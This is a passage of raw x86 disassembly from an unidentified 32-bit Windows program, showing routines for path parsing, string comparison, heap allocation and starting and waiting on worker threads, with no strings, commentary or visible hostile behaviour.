  401663:	8b 0f                	mov    (%edi),%ecx
  401665:	8b 51 1c             	mov    0x1c(%ecx),%edx
  401668:	89 56 0c             	mov    %edx,0xc(%esi)
  40166b:	8b 07                	mov    (%edi),%eax
  40166d:	8b 48 20             	mov    0x20(%eax),%ecx
  401670:	83 c4 0c             	add    $0xc,%esp
  401673:	6a 20                	push   $0x20
  401675:	83 c1 0c             	add    $0xc,%ecx
  401678:	51                   	push   %ecx
  401679:	8d 56 10             	lea    0x10(%esi),%edx
  40167c:	52                   	push   %edx
  40167d:	e8 be fa ff ff       	call   0x401140
  401682:	83 c4 0c             	add    $0xc,%esp
  401685:	ba 30 00 00 00       	mov    $0x30,%edx
  40168a:	8b c6                	mov    %esi,%eax
  40168c:	e8 5f 2a 00 00       	call   0x4040f0
  401691:	89 46 30             	mov    %eax,0x30(%esi)
  401694:	8b 45 00             	mov    0x0(%ebp),%eax
  401697:	89 03                	mov    %eax,(%ebx)
  401699:	8b 0f                	mov    (%edi),%ecx
  40169b:	8b 51 18             	mov    0x18(%ecx),%edx
  40169e:	89 53 04             	mov    %edx,0x4(%ebx)
  4016a1:	8b 07                	mov    (%edi),%eax
  4016a3:	8b 48 14             	mov    0x14(%eax),%ecx
  4016a6:	89 4b 08             	mov    %ecx,0x8(%ebx)
  4016a9:	8b 17                	mov    (%edi),%edx
  4016ab:	8b 42 1c             	mov    0x1c(%edx),%eax
  4016ae:	89 43 0c             	mov    %eax,0xc(%ebx)
  4016b1:	8b 0f                	mov    (%edi),%ecx
  4016b3:	8b 51 28             	mov    0x28(%ecx),%edx
  4016b6:	6a 20                	push   $0x20
  4016b8:	83 c2 0c             	add    $0xc,%edx
  4016bb:	52                   	push   %edx
  4016bc:	8d 43 10             	lea    0x10(%ebx),%eax
  4016bf:	50                   	push   %eax
  4016c0:	e8 7b fa ff ff       	call   0x401140
  4016c5:	83 c4 0c             	add    $0xc,%esp
  4016c8:	ba 30 00 00 00       	mov    $0x30,%edx
  4016cd:	8b c3                	mov    %ebx,%eax
  4016cf:	e8 1c 2a 00 00       	call   0x4040f0
  4016d4:	56                   	push   %esi
  4016d5:	89 43 30             	mov    %eax,0x30(%ebx)
  4016d8:	e8 73 10 00 00       	call   0x402750
  4016dd:	84 c0                	test   %al,%al
  4016df:	0f 84 0a ff ff ff    	je     0x4015ef
  4016e5:	53                   	push   %ebx
  4016e6:	e8 65 10 00 00       	call   0x402750
  4016eb:	84 c0                	test   %al,%al
  4016ed:	0f 84 fc fe ff ff    	je     0x4015ef
  4016f3:	8b 0f                	mov    (%edi),%ecx
  4016f5:	89 71 24             	mov    %esi,0x24(%ecx)
  4016f8:	8b 17                	mov    (%edi),%edx
  4016fa:	89 5a 2c             	mov    %ebx,0x2c(%edx)
  4016fd:	8b 7f 04             	mov    0x4(%edi),%edi
  401700:	85 ff                	test   %edi,%edi
  401702:	0f 85 f7 fe ff ff    	jne    0x4015ff
  401708:	55                   	push   %ebp
  401709:	6a 00                	push   $0x0
  40170b:	ff 15 90 80 40 00    	call   *0x408090
  401711:	50                   	push   %eax
  401712:	ff 15 8c 80 40 00    	call   *0x40808c
  401718:	5f                   	pop    %edi
  401719:	5e                   	pop    %esi
  40171a:	5d                   	pop    %ebp
  40171b:	b0 01                	mov    $0x1,%al
  40171d:	5b                   	pop    %ebx
  40171e:	59                   	pop    %ecx
  40171f:	c3                   	ret
  401720:	0f b7 10             	movzwl (%eax),%edx
  401723:	83 ec 10             	sub    $0x10,%esp
  401726:	66 85 d2             	test   %dx,%dx
  401729:	56                   	push   %esi
  40172a:	57                   	push   %edi
  40172b:	8b c8                	mov    %eax,%ecx
  40172d:	74 15                	je     0x401744
  40172f:	0f b7 f2             	movzwl %dx,%esi
  401732:	66 83 fe 5c          	cmp    $0x5c,%si
  401736:	74 12                	je     0x40174a
  401738:	0f b7 71 02          	movzwl 0x2(%ecx),%esi
  40173c:	83 c1 02             	add    $0x2,%ecx
  40173f:	66 85 f6             	test   %si,%si
  401742:	75 ee                	jne    0x401732
  401744:	66 83 39 5c          	cmpw   $0x5c,(%ecx)
  401748:	75 2e                	jne    0x401778
  40174a:	2b c8                	sub    %eax,%ecx
  40174c:	8b f1                	mov    %ecx,%esi
  40174e:	d1 fe                	sar    $1,%esi
  401750:	83 fe 07             	cmp    $0x7,%esi
  401753:	0f 8f b0 00 00 00    	jg     0x401809
  401759:	53                   	push   %ebx
  40175a:	56                   	push   %esi
  40175b:	8b d0                	mov    %eax,%edx
  40175d:	bf 08 00 00 00       	mov    $0x8,%edi
  401762:	8d 5c 24 10          	lea    0x10(%esp),%ebx
  401766:	e8 45 28 00 00       	call   0x403fb0
  40176b:	83 c4 04             	add    $0x4,%esp
  40176e:	66 c7 44 74 0c 00 00 	movw   $0x0,0xc(%esp,%esi,2)
  401775:	5b                   	pop    %ebx
  401776:	eb 28                	jmp    0x4017a0
  401778:	8d 54 24 08          	lea    0x8(%esp),%edx
  40177c:	be 08 00 00 00       	mov    $0x8,%esi
  401781:	2b d0                	sub    %eax,%edx
  401783:	0f b7 08             	movzwl (%eax),%ecx
  401786:	66 89 0c 02          	mov    %cx,(%edx,%eax,1)
  40178a:	83 c0 02             	add    $0x2,%eax
  40178d:	66 85 c9             	test   %cx,%cx
  401790:	74 05                	je     0x401797
  401792:	83 ee 01             	sub    $0x1,%esi
  401795:	75 ec                	jne    0x401783
  401797:	85 f6                	test   %esi,%esi
  401799:	75 05                	jne    0x4017a0
  40179b:	66 89 74 24 16       	mov    %si,0x16(%esp)
  4017a0:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4017a4:	8b 78 04             	mov    0x4(%eax),%edi
  4017a7:	85 ff                	test   %edi,%edi
  4017a9:	74 5e                	je     0x401809
  4017ab:	eb 03                	jmp    0x4017b0
  4017ad:	8d 49 00             	lea    0x0(%ecx),%ecx
  4017b0:	8b 37                	mov    (%edi),%esi
  4017b2:	8d 54 24 08          	lea    0x8(%esp),%edx
  4017b6:	8b ca                	mov    %edx,%ecx
  4017b8:	2b f1                	sub    %ecx,%esi
  4017ba:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  4017c0:	0f b7 04 16          	movzwl (%esi,%edx,1),%eax
  4017c4:	66 3d 41 00          	cmp    $0x41,%ax
  4017c8:	72 09                	jb     0x4017d3
  4017ca:	66 3d 5a 00          	cmp    $0x5a,%ax
  4017ce:	77 03                	ja     0x4017d3
  4017d0:	83 c0 20             	add    $0x20,%eax
  4017d3:	0f b7 c8             	movzwl %ax,%ecx
  4017d6:	0f b7 02             	movzwl (%edx),%eax
  4017d9:	66 3d 41 00          	cmp    $0x41,%ax
  4017dd:	72 09                	jb     0x4017e8
  4017df:	66 3d 5a 00          	cmp    $0x5a,%ax
  4017e3:	77 03                	ja     0x4017e8
  4017e5:	83 c0 20             	add    $0x20,%eax
  4017e8:	83 c2 02             	add    $0x2,%edx
  4017eb:	66 85 c9             	test   %cx,%cx
  4017ee:	0f b7 c0             	movzwl %ax,%eax
  4017f1:	74 05                	je     0x4017f8
  4017f3:	66 3b c8             	cmp    %ax,%cx
  4017f6:	74 c8                	je     0x4017c0
  4017f8:	0f b7 d0             	movzwl %ax,%edx
  4017fb:	0f b7 c1             	movzwl %cx,%eax
  4017fe:	2b c2                	sub    %edx,%eax
  401800:	74 11                	je     0x401813
  401802:	8b 7f 04             	mov    0x4(%edi),%edi
  401805:	85 ff                	test   %edi,%edi
  401807:	75 a7                	jne    0x4017b0
  401809:	5f                   	pop    %edi
  40180a:	33 c0                	xor    %eax,%eax
  40180c:	5e                   	pop    %esi
  40180d:	83 c4 10             	add    $0x10,%esp
  401810:	c2 04 00             	ret    $0x4
  401813:	8b 07                	mov    (%edi),%eax
  401815:	5f                   	pop    %edi
  401816:	5e                   	pop    %esi
  401817:	83 c4 10             	add    $0x10,%esp
  40181a:	c2 04 00             	ret    $0x4
  40181d:	cc                   	int3
  40181e:	cc                   	int3
  40181f:	cc                   	int3
  401820:	55                   	push   %ebp
  401821:	8b ec                	mov    %esp,%ebp
  401823:	83 e4 f8             	and    $0xfffffff8,%esp
  401826:	83 ec 14             	sub    $0x14,%esp
  401829:	a1 58 b2 41 00       	mov    0x41b258,%eax
  40182e:	53                   	push   %ebx
  40182f:	56                   	push   %esi
  401830:	57                   	push   %edi
  401831:	50                   	push   %eax
  401832:	8b 45 08             	mov    0x8(%ebp),%eax
  401835:	e8 e6 fe ff ff       	call   0x401720
  40183a:	85 c0                	test   %eax,%eax
  40183c:	89 44 24 18          	mov    %eax,0x18(%esp)
  401840:	0f 84 62 01 00 00    	je     0x4019a8
  401846:	a1 80 b2 41 00       	mov    0x41b280,%eax
  40184b:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40184f:	51                   	push   %ecx
  401850:	6a 0e                	push   $0xe
  401852:	e8 f9 10 00 00       	call   0x402950
  401857:	8d 54 24 0c          	lea    0xc(%esp),%edx
  40185b:	8b f0                	mov    %eax,%esi
  40185d:	a1 80 b2 41 00       	mov    0x41b280,%eax
  401862:	52                   	push   %edx
  401863:	6a 0f                	push   $0xf
  401865:	89 74 24 1c          	mov    %esi,0x1c(%esp)
  401869:	e8 e2 10 00 00       	call   0x402950
  40186e:	8b f8                	mov    %eax,%edi
  401870:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401874:	50                   	push   %eax
  401875:	a1 80 b2 41 00       	mov    0x41b280,%eax
  40187a:	6a 01                	push   $0x1
  40187c:	89 7c 24 24          	mov    %edi,0x24(%esp)
  401880:	e8 cb 10 00 00       	call   0x402950
  401885:	85 f6                	test   %esi,%esi
  401887:	89 44 24 10          	mov    %eax,0x10(%esp)
  40188b:	0f 84 17 01 00 00    	je     0x4019a8
  401891:	85 ff                	test   %edi,%edi
  401893:	0f 84 0f 01 00 00    	je     0x4019a8
  401899:	85 c0                	test   %eax,%eax
  40189b:	0f 84 07 01 00 00    	je     0x4019a8
  4018a1:	8b 1d 90 80 40 00    	mov    0x408090,%ebx
  4018a7:	68 30 08 01 00       	push   $0x10830
  4018ac:	6a 00                	push   $0x0
  4018ae:	ff d3                	call   *%ebx
  4018b0:	50                   	push   %eax
  4018b1:	ff 15 84 80 40 00    	call   *0x408084
  4018b7:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  4018bb:	8b 55 08             	mov    0x8(%ebp),%edx
  4018be:	8b f0                	mov    %eax,%esi
  4018c0:	89 0e                	mov    %ecx,(%esi)
  4018c2:	89 56 04             	mov    %edx,0x4(%esi)
  4018c5:	8b 07                	mov    (%edi),%eax
  4018c7:	85 c0                	test   %eax,%eax
  4018c9:	74 0e                	je     0x4018d9
  4018cb:	50                   	push   %eax
  4018cc:	6a 00                	push   $0x0
  4018ce:	ff d3                	call   *%ebx
  4018d0:	50                   	push   %eax
  4018d1:	ff 15 84 80 40 00    	call   *0x408084
  4018d7:	eb 02                	jmp    0x4018db
  4018d9:	33 c0                	xor    %eax,%eax
  4018db:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4018df:	89 46 0c             	mov    %eax,0xc(%esi)
  4018e2:	8b 07                	mov    (%edi),%eax
  4018e4:	89 46 10             	mov    %eax,0x10(%esi)
  4018e7:	8b 44 24 10          	mov    0x10(%esp),%eax
  4018eb:	89 46 08             	mov    %eax,0x8(%esi)
  4018ee:	8b 11                	mov    (%ecx),%edx
  4018f0:	8b 0d 88 b2 41 00    	mov    0x41b288,%ecx
  4018f6:	51                   	push   %ecx
  4018f7:	8b 0d 24 90 41 00    	mov    0x419024,%ecx
  4018fd:	89 56 14             	mov    %edx,0x14(%esi)
  401900:	8b 16                	mov    (%esi),%edx
  401902:	50                   	push   %eax
  401903:	c6 46 20 00          	movb   $0x0,0x20(%esi)
  401907:	c6 46 21 00          	movb   $0x0,0x21(%esi)
  40190b:	8b 42 18             	mov    0x18(%edx),%eax
  40190e:	50                   	push   %eax
  40190f:	51                   	push   %ecx
  401910:	8d 96 2a 00 01 00    	lea    0x1002a(%esi),%edx
  401916:	52                   	push   %edx
  401917:	ff 15 88 81 40 00    	call   *0x408188
  40191d:	83 c4 14             	add    $0x14,%esp
  401920:	e8 bb 15 00 00       	call   0x402ee0
  401925:	85 c0                	test   %eax,%eax
  401927:	74 0a                	je     0x401933
  401929:	8b 3e                	mov    (%esi),%edi
  40192b:	50                   	push   %eax
  40192c:	e8 bf 12 00 00       	call   0x402bf0
  401931:	eb 02                	jmp    0x401935
  401933:	33 c0                	xor    %eax,%eax
  401935:	33 c9                	xor    %ecx,%ecx
  401937:	3b c1                	cmp    %ecx,%eax
  401939:	89 46 28             	mov    %eax,0x28(%esi)
  40193c:	75 05                	jne    0x401943
  40193e:	e8 8d 4c 00 00       	call   0x4065d0
  401943:	51                   	push   %ecx
  401944:	51                   	push   %ecx
  401945:	56                   	push   %esi
  401946:	68 20 26 40 00       	push   $0x402620
  40194b:	51                   	push   %ecx
  40194c:	51                   	push   %ecx
  40194d:	89 4e 18             	mov    %ecx,0x18(%esi)
  401950:	89 4e 1c             	mov    %ecx,0x1c(%esi)
  401953:	ff 15 14 81 40 00    	call   *0x408114
  401959:	8b f8                	mov    %eax,%edi
  40195b:	6a ff                	push   $0xffffffff
  40195d:	57                   	push   %edi
  40195e:	ff 15 10 81 40 00    	call   *0x408110
  401964:	57                   	push   %edi
  401965:	ff 15 48 81 40 00    	call   *0x408148
  40196b:	8b 46 0c             	mov    0xc(%esi),%eax
  40196e:	50                   	push   %eax
  40196f:	6a 00                	push   $0x0
  401971:	ff d3                	call   *%ebx
  401973:	8b 3d 8c 80 40 00    	mov    0x40808c,%edi
  401979:	50                   	push   %eax
  40197a:	ff d7                	call   *%edi
  40197c:	56                   	push   %esi
  40197d:	6a 00                	push   $0x0
  40197f:	ff d3                	call   *%ebx
  401981:	50                   	push   %eax
  401982:	ff d7                	call   *%edi
  401984:	8b 44 24 10          	mov    0x10(%esp),%eax
  401988:	50                   	push   %eax
  401989:	6a 00                	push   $0x0
  40198b:	ff d3                	call   *%ebx
  40198d:	50                   	push   %eax
  40198e:	ff d7                	call   *%edi
  401990:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  401994:	51                   	push   %ecx
  401995:	6a 00                	push   $0x0
  401997:	ff d3                	call   *%ebx
  401999:	50                   	push   %eax
  40199a:	ff d7                	call   *%edi
  40199c:	8b 54 24 14          	mov    0x14(%esp),%edx
  4019a0:	52                   	push   %edx
  4019a1:	6a 00                	push   $0x0
  4019a3:	ff d3                	call   *%ebx
  4019a5:	50                   	push   %eax
  4019a6:	ff d7                	call   *%edi
  4019a8:	5f                   	pop    %edi
  4019a9:	5e                   	pop    %esi
  4019aa:	5b                   	pop    %ebx
  4019ab:	8b e5                	mov    %ebp,%esp
  4019ad:	5d                   	pop    %ebp
  4019ae:	c2 04 00             	ret    $0x4
  4019b1:	cc                   	int3
  4019b2:	cc                   	int3
  4019b3:	cc                   	int3
  4019b4:	cc                   	int3
  4019b5:	cc                   	int3
  4019b6:	cc                   	int3
  4019b7:	cc                   	int3
  4019b8:	cc                   	int3
  4019b9:	cc                   	int3
  4019ba:	cc                   	int3
  4019bb:	cc                   	int3
  4019bc:	cc                   	int3
  4019bd:	cc                   	int3
  4019be:	cc                   	int3
  4019bf:	cc                   	int3
  4019c0:	55                   	push   %ebp
  4019c1:	8b ec                	mov    %esp,%ebp
  4019c3:	83 e4 f8             	and    $0xfffffff8,%esp
  4019c6:	83 ec 24             	sub    $0x24,%esp
  4019c9:	8b 45 08             	mov    0x8(%ebp),%eax
  4019cc:	53                   	push   %ebx
  4019cd:	56                   	push   %esi
  4019ce:	57                   	push   %edi
  4019cf:	8b 78 04             	mov    0x4(%eax),%edi
  4019d2:	85 ff                	test   %edi,%edi
  4019d4:	89 7c 24 18          	mov    %edi,0x18(%esp)
  4019d8:	0f 84 88 02 00 00    	je     0x401c66
  4019de:	83 38 00             	cmpl   $0x0,(%eax)
  4019e1:	0f 84 7f 02 00 00    	je     0x401c66
  4019e7:	8d 44 24 20          	lea    0x20(%esp),%eax
  4019eb:	50                   	push   %eax
  4019ec:	a1 80 b2 41 00       	mov    0x41b280,%eax
  4019f1:	6a 0e                	push   $0xe
  4019f3:	e8 58 0f 00 00       	call   0x402950
  4019f8:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  4019fc:	8b f0                	mov    %eax,%esi
  4019fe:	a1 80 b2 41 00       	mov    0x41b280,%eax
  401a03:	51                   	push   %ecx
  401a04:	6a 0f                	push   $0xf
  401a06:	89 74 24 34          	mov    %esi,0x34(%esp)
  401a0a:	e8 41 0f 00 00       	call   0x402950
  401a0f:	8d 54 24 20          	lea    0x20(%esp),%edx
  401a13:	8b d8                	mov    %eax,%ebx
  401a15:	a1 80 b2 41 00       	mov    0x41b280,%eax
  401a1a:	52                   	push   %edx
  401a1b:	6a 01                	push   $0x1
  401a1d:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  401a21:	e8 2a 0f 00 00       	call   0x402950
  401a26:	85 f6                	test   %esi,%esi
  401a28:	89 44 24 28          	mov    %eax,0x28(%esp)
  401a2c:	0f 84 34 02 00 00    	je     0x401c66
  401a32:	85 db                	test   %ebx,%ebx
  401a34:	0f 84 2c 02 00 00    	je     0x401c66
  401a3a:	85 c0                	test   %eax,%eax
  401a3c:	0f 84 24 02 00 00    	je     0x401c66
  401a42:	8b 45 08             	mov    0x8(%ebp),%eax
  401a45:	8b 00                	mov    (%eax),%eax
  401a47:	8b 1d 90 80 40 00    	mov    0x408090,%ebx
  401a4d:	03 c0                	add    %eax,%eax
  401a4f:	03 c0                	add    %eax,%eax
  401a51:	74 14                	je     0x401a67
  401a53:	50                   	push   %eax
  401a54:	6a 00                	push   $0x0
  401a56:	ff d3                	call   *%ebx
  401a58:	50                   	push   %eax
  401a59:	ff 15 84 80 40 00    	call   *0x408084
  401a5f:	8b f0                	mov    %eax,%esi
  401a61:	89 74 24 10          	mov    %esi,0x10(%esp)
  401a65:	eb 0c                	jmp    0x401a73
  401a67:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  401a6e:	00 
  401a6f:	8b 74 24 10          	mov    0x10(%esp),%esi
  401a73:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401a76:	8b 01                	mov    (%ecx),%eax
  401a78:	03 c0                	add    %eax,%eax
  401a7a:	03 c0                	add    %eax,%eax
  401a7c:	74 18                	je     0x401a96
  401a7e:	50                   	push   %eax
  401a7f:	6a 00                	push   $0x0
  401a81:	ff d3                	call   *%ebx
  401a83:	50                   	push   %eax
  401a84:	ff 15 84 80 40 00    	call   *0x408084
  401a8a:	89 44 24 14          	mov    %eax,0x14(%esp)
  401a8e:	2b c6                	sub    %esi,%eax
  401a90:	89 44 24 24          	mov    %eax,0x24(%esp)
  401a94:	eb 1e                	jmp    0x401ab4
  401a96:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  401a9d:	00 
  401a9e:	8b 44 24 14          	mov    0x14(%esp),%eax
  401aa2:	2b c6                	sub    %esi,%eax
  401aa4:	89 44 24 24          	mov    %eax,0x24(%esp)
  401aa8:	eb 0a                	jmp    0x401ab4
  401aaa:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  401ab0:	8b 7c 24 18          	mov    0x18(%esp),%edi
  401ab4:	8b 17                	mov    (%edi),%edx
  401ab6:	66 83 3a 00          	cmpw   $0x0,(%edx)
  401aba:	0f 84 fa 00 00 00    	je     0x401bba
  401ac0:	68 30 08 01 00       	push   $0x10830
  401ac5:	6a 00                	push   $0x0
  401ac7:	ff d3                	call   *%ebx
  401ac9:	50                   	push   %eax
  401aca:	ff 15 84 80 40 00    	call   *0x408084
  401ad0:	89 06                	mov    %eax,(%esi)
  401ad2:	8b 0f                	mov    (%edi),%ecx
  401ad4:	89 08                	mov    %ecx,(%eax)
  401ad6:	8b 07                	mov    (%edi),%eax
  401ad8:	8b 16                	mov    (%esi),%edx
  401ada:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  401ade:	89 42 04             	mov    %eax,0x4(%edx)
  401ae1:	8b 01                	mov    (%ecx),%eax
  401ae3:	85 c0                	test   %eax,%eax
  401ae5:	74 0e                	je     0x401af5
  401ae7:	50                   	push   %eax
  401ae8:	6a 00                	push   $0x0
  401aea:	ff d3                	call   *%ebx
  401aec:	50                   	push   %eax
  401aed:	ff 15 84 80 40 00    	call   *0x408084
  401af3:	eb 02                	jmp    0x401af7
  401af5:	33 c0                	xor    %eax,%eax
  401af7:	8b 16                	mov    (%esi),%edx
  401af9:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  401afd:	89 42 0c             	mov    %eax,0xc(%edx)
  401b00:	8b 11                	mov    (%ecx),%edx
  401b02:	8b 06                	mov    (%esi),%eax
  401b04:	89 50 10             	mov    %edx,0x10(%eax)
  401b07:	8b 0e                	mov    (%esi),%ecx
  401b09:	8b 44 24 28          	mov    0x28(%esp),%eax
  401b0d:	89 41 08             	mov    %eax,0x8(%ecx)
  401b10:	8b 16                	mov    (%esi),%edx
  401b12:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  401b16:	8b 09                	mov    (%ecx),%ecx
  401b18:	89 4a 14             	mov    %ecx,0x14(%edx)
  401b1b:	8b 16                	mov    (%esi),%edx
  401b1d:	c6 42 20 00          	movb   $0x0,0x20(%edx)
  401b21:	8b 15 88 b2 41 00    	mov    0x41b288,%edx
  401b27:	8b 0e                	mov    (%esi),%ecx
  401b29:	52                   	push   %edx
  401b2a:	8b 15 24 90 41 00    	mov    0x419024,%edx
  401b30:	50                   	push   %eax
  401b31:	c6 41 21 01          	movb   $0x1,0x21(%ecx)
  401b35:	8b 07                	mov    (%edi),%eax
  401b37:	8b 48 18             	mov    0x18(%eax),%ecx
  401b3a:	8b 06                	mov    (%esi),%eax
  401b3c:	51                   	push   %ecx
  401b3d:	52                   	push   %edx
  401b3e:	05 2a 00 01 00       	add    $0x1002a,%eax
  401b43:	50                   	push   %eax
  401b44:	ff 15 88 81 40 00    	call   *0x408188
  401b4a:	8b 0d 50 b2 41 00    	mov    0x41b250,%ecx
  401b50:	8b 01                	mov    (%ecx),%eax
  401b52:	83 c4 14             	add    $0x14,%esp
  401b55:	85 c0                	test   %eax,%eax
  401b57:	74 2a                	je     0x401b83
  401b59:	8b 48 04             	mov    0x4(%eax),%ecx
  401b5c:	85 c9                	test   %ecx,%ecx
  401b5e:	74 09                	je     0x401b69
  401b60:	8b c1                	mov    %ecx,%eax
  401b62:	8b 48 04             	mov    0x4(%eax),%ecx
  401b65:	85 c9                	test   %ecx,%ecx
  401b67:	75 f7                	jne    0x401b60
  401b69:	83 38 00             	cmpl   $0x0,(%eax)
  401b6c:	74 15                	je     0x401b83
  401b6e:	8b 16                	mov    (%esi),%edx
  401b70:	e8 6b 13 00 00       	call   0x402ee0
  401b75:	8b 3a                	mov    (%edx),%edi
  401b77:	50                   	push   %eax
  401b78:	e8 73 10 00 00       	call   0x402bf0
  401b7d:	8b 7c 24 18          	mov    0x18(%esp),%edi
  401b81:	eb 02                	jmp    0x401b85
  401b83:	33 c0                	xor    %eax,%eax
  401b85:	8b 0e                	mov    (%esi),%ecx
  401b87:	89 41 28             	mov    %eax,0x28(%ecx)
  401b8a:	8b 06                	mov    (%esi),%eax
  401b8c:	33 c9                	xor    %ecx,%ecx
  401b8e:	39 48 28             	cmp    %ecx,0x28(%eax)
  401b91:	75 05                	jne    0x401b98
  401b93:	e8 38 4a 00 00       	call   0x4065d0
  401b98:	51                   	push   %ecx
  401b99:	89 48 18             	mov    %ecx,0x18(%eax)
  401b9c:	51                   	push   %ecx
  401b9d:	89 48 1c             	mov    %ecx,0x1c(%eax)
  401ba0:	8b 16                	mov    (%esi),%edx
  401ba2:	52                   	push   %edx
  401ba3:	68 20 26 40 00       	push   $0x402620
  401ba8:	51                   	push   %ecx
  401ba9:	51                   	push   %ecx
  401baa:	ff 15 14 81 40 00    	call   *0x408114
  401bb0:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  401bb4:	89 04 31             	mov    %eax,(%ecx,%esi,1)
  401bb7:	83 c6 04             	add    $0x4,%esi
  401bba:	8b 7f 04             	mov    0x4(%edi),%edi
  401bbd:	85 ff                	test   %edi,%edi
  401bbf:	89 7c 24 18          	mov    %edi,0x18(%esp)
  401bc3:	0f 85 e7 fe ff ff    	jne    0x401ab0
  401bc9:	8b 54 24 14          	mov    0x14(%esp),%edx
  401bcd:	8b 75 08             	mov    0x8(%ebp),%esi
  401bd0:	8b 06                	mov    (%esi),%eax
  401bd2:	6a ff                	push   $0xffffffff
  401bd4:	6a 01                	push   $0x1
  401bd6:	52                   	push   %edx
  401bd7:	50                   	push   %eax
  401bd8:	ff 15 28 81 40 00    	call   *0x408128
  401bde:	39 3e                	cmp    %edi,(%esi)
  401be0:	89 7c 24 18          	mov    %edi,0x18(%esp)
  401be4:	8b 3d 8c 80 40 00    	mov    0x40808c,%edi
  401bea:	76 3e                	jbe    0x401c2a
  401bec:	8b 74 24 10          	mov    0x10(%esp),%esi
  401bf0:	8b 0e                	mov    (%esi),%ecx
  401bf2:	8b 41 0c             	mov    0xc(%ecx),%eax
  401bf5:	50                   	push   %eax
  401bf6:	6a 00                	push   $0x0
  401bf8:	ff d3                	call   *%ebx
  401bfa:	50                   	push   %eax
  401bfb:	ff d7                	call   *%edi
  401bfd:	8b 06                	mov    (%esi),%eax
  401bff:	50                   	push   %eax
  401c00:	6a 00                	push   $0x0
  401c02:	ff d3                	call   *%ebx
  401c04:	50                   	push   %eax
  401c05:	ff d7                	call   *%edi
  401c07:	8b 54 24 24          	mov    0x24(%esp),%edx
  401c0b:	8b 04 16             	mov    (%esi,%edx,1),%eax
  401c0e:	50                   	push   %eax
  401c0f:	ff 15 48 81 40 00    	call   *0x408148
  401c15:	8b 44 24 18          	mov    0x18(%esp),%eax
  401c19:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401c1c:	83 c0 01             	add    $0x1,%eax
  401c1f:	83 c6 04             	add    $0x4,%esi
  401c22:	3b 01                	cmp    (%ecx),%eax
  401c24:	89 44 24 18          	mov    %eax,0x18(%esp)
  401c28:	72 c6                	jb     0x401bf0
  401c2a:	8b 54 24 10          	mov    0x10(%esp),%edx
  401c2e:	52                   	push   %edx
  401c2f:	6a 00                	push   $0x0
  401c31:	ff d3                	call   *%ebx
  401c33:	50                   	push   %eax
  401c34:	ff d7                	call   *%edi
  401c36:	8b 44 24 14          	mov    0x14(%esp),%eax
  401c3a:	50                   	push   %eax
  401c3b:	6a 00                	push   $0x0
  401c3d:	ff d3                	call   *%ebx
  401c3f:	50                   	push   %eax
  401c40:	ff d7                	call   *%edi
  401c42:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  401c46:	51                   	push   %ecx
  401c47:	6a 00                	push   $0x0
  401c49:	ff d3                	call   *%ebx
  401c4b:	50                   	push   %eax
  401c4c:	ff d7                	call   *%edi
  401c4e:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  401c52:	52                   	push   %edx
  401c53:	6a 00                	push   $0x0
  401c55:	ff d3                	call   *%ebx
  401c57:	50                   	push   %eax
  401c58:	ff d7                	call   *%edi
  401c5a:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  401c5e:	50                   	push   %eax
  401c5f:	6a 00                	push   $0x0
  401c61:	ff d3                	call   *%ebx
  401c63:	50                   	push   %eax
  401c64:	ff d7                	call   *%edi
  401c66:	5f                   	pop    %edi
  401c67:	5e                   	pop    %esi
  401c68:	5b                   	pop    %ebx
  401c69:	8b e5                	mov    %ebp,%esp
  401c6b:	5d                   	pop    %ebp
  401c6c:	c2 04 00             	ret    $0x4
  401c6f:	cc                   	int3
  401c70:	55                   	push   %ebp
  401c71:	8b ec                	mov    %esp,%ebp
  401c73:	83 e4 f8             	and    $0xfffffff8,%esp
  401c76:	8b 45 08             	mov    0x8(%ebp),%eax
  401c79:	83 ec 14             	sub    $0x14,%esp
  401c7c:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  401c80:	53                   	push   %ebx
  401c81:	56                   	push   %esi
  401c82:	57                   	push   %edi
  401c83:	0f 84 84 01 00 00    	je     0x401e0d
  401c89:	a1 80 b2 41 00       	mov    0x41b280,%eax
  401c8e:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  401c92:	51                   	push   %ecx
  401c93:	6a 0e                	push   $0xe
  401c95:	e8 b6 0c 00 00       	call   0x402950
  401c9a:	8d 54 24 14          	lea    0x14(%esp),%edx
  401c9e:	8b f0                	mov    %eax,%esi
  401ca0:	a1 80 b2 41 00       	mov    0x41b280,%eax
  401ca5:	52                   	push   %edx
  401ca6:	6a 0f                	push   $0xf
  401ca8:	89 74 24 20          	mov    %esi,0x20(%esp)
  401cac:	e8 9f 0c 00 00       	call   0x402950
  401cb1:	8b f8                	mov    %eax,%edi
  401cb3:	8d 44 24 14          	lea    0x14(%esp),%eax
  401cb7:	50                   	push   %eax
  401cb8:	a1 80 b2 41 00       	mov    0x41b280,%eax
  401cbd:	6a 01                	push   $0x1
  401cbf:	89 7c 24 24          	mov    %edi,0x24(%esp)
  401cc3:	e8 88 0c 00 00       	call   0x402950
  401cc8:	85 f6                	test   %esi,%esi
  401cca:	89 44 24 10          	mov    %eax,0x10(%esp)
  401cce:	0f 84 39 01 00 00    	je     0x401e0d
  401cd4:	85 ff                	test   %edi,%edi
  401cd6:	0f 84 31 01 00 00    	je     0x401e0d
  401cdc:	85 c0                	test   %eax,%eax
  401cde:	0f 84 29 01 00 00    	je     0x401e0d
  401ce4:	8b 1d 90 80 40 00    	mov    0x408090,%ebx
  401cea:	68 30 08 01 00       	push   $0x10830
  401cef:	6a 00                	push   $0x0
  401cf1:	ff d3                	call   *%ebx
  401cf3:	50                   	push   %eax
